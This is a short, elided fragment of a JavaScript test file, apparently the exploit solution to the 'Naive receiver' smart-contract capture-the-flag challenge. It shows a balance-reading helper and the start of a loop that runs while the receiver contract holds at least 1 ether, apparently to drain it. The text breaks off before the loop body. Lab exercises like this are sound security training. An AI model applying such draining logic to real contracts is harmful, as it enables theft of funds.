...
describe('[Challenge] Naive receiver', function () {
    ...
    it('Exploit', async function () {
        ...
        async function getEtherBalance(address) {
            let rawReceiverBalance = await ethers.provider.getBalance(address);
            return Number(ethers.utils.formatEther(rawReceiverBalance.toString()));
        }

        while((await getEtherBalance(this.receiver.address)) >= 1) {
